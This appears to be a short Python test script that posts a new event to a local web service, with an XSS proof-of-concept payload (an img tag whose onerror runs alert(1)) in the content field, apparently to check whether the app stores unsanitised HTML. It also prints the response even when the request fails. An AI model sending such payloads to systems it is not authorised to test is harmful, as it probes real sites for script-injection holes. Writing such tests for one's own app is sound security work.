import requests

url = 'http://192.168.64.1:1204/events/newevent'
data = {
    "title": "test2", 
    "content": '<img src=0 onerror="alert(1)"/>'
}

try:
    response = requests.post(url, json=data)
except Exception as e:
    print('요청 중 오류 발생:', e)
print(response.text)
